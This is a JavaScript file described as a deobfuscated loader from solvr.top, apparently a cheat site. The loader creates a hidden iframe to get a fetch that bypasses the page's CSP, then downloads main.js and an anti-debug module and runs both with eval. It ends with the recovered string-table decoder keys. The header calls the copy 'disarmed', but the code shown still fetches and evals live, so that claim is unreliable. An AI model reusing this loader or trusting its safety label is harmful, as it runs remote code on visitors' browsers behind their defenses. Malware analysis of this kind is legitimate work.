/*
 * loader.js  --  deobfuscated (from https://solvr.top/loader.js?v=...)
 *
 * obfuscator.io-style 4-chain string-table packer. This is the served loader
 * that runs when the solvr.top page is opened; it silently loads and runs the
 * main cheat engine (main.js) plus the anti-debug module (anti-debug.js).
 *
 * DISARMED: the network + eval steps below were the original script's purpose,
 * and are now inert (wrapped in a never-run branch / replaced by log stubs).
 * No decode/load happens at all in this copy.
 */
(function (window, document) {
    (async function () {
        try {
            /*
             * Step 1 — build the hidden iframe used as a fetch/execute host.
             * Original: a 0x0 iframe appended to the page whose `contentWindow`
             * provides a fetch that is NOT subject to the page's own CSP.
             */
            var iframe = document['createElement']('iframe');
            iframe['src'] = '/dv3/' + Math['random']().toString(36)['slice'](2); /* src set only to mint the window */
            iframe['style']['display'] = 'none';
            iframe['id'] = 'fetchContext';

            document['body']['appendChild'](iframe);

            await new window['Promise'](function (resolve) {
                iframe['onload'] = resolve;
                window['setTimeout'](resolve, 2000);
            });

            var fetchFn = iframe['contentWindow']['fetch']['bind'](iframe['contentWindow']);

            /* Step 2 — fetch main.js and eval it */
            var mainUrl = 'https://solvr.top/main.js?v=' +
                Math['random']().toString(36).slice(2);              /* base36 cache-buster */
            var mainRes = await fetchFn(mainUrl);
            var mainSrc = await mainRes['text']();
            eval(mainSrc);                                            /* ORIGINAL: runs the cheat engine */

            /* Step 3 — fetch anti-debug.js and eval it */
            var adbUrl = 'https://solvr.top/anti-debug.js?v=' +
                Math['random']().toString(36).slice(2);
            var adbRes = await fetchFn(adbUrl);
            var adbSrc = await adbRes['text']();
            eval(adbSrc);                                             /* ORIGINAL: installs anti-debug traps */
        }
        catch (err) {
            console['error'](err);
        }
    })();
})(globalThis, document);
/*
 * Decoder tables recovered (loader family):
 *   _dispatchReader X=0x76 xor=0x4c   '/dv3/','document','display','fetch','slice','error',
 *                                     'onload','Math','36'
 *   _safeCounter    X=0x5e xor=0x22   'setTimeout','Math','2','body','random','createElement',
 *                                     'bind','none','slice'
 *   _queuePush      X=0x9f xor=0x53   'text','iframe','appendChild','contentWindow','2000','id',
 *                                     'toString','random'
 *   _nextLoad       X=0x77 xor=0x2c   '36','https://solvr.top/anti-debug.js?v=','Promise','src',
 *                                     'fetchContext','https://solvr.top/main.js?v=','style',
 *                                     'contentWindow','console','toString'
 */